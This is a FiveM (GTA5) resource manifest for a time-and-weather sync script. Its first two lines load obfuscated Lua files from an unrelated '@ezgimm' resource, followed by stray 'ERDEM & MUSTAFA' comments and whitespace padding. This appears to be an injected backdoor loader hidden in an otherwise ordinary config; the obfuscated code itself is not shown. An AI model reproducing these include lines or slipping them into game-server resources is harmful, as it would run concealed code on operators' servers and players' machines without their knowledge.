shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
 
 

fx_version 'cerulean'
game 'gta5'
lua54 'yes'
author 'Kakarot'
description 'Syncs the time & weather for all players on the server and allows editing by command'
version '2.1.0'

shared_scripts {
    'config.lua',
    '@qb-core/shared/locale.lua',
    'locales/en.lua',
    'locales/*.lua'
}

server_script 'server/server.lua'
client_script 'client/client.lua'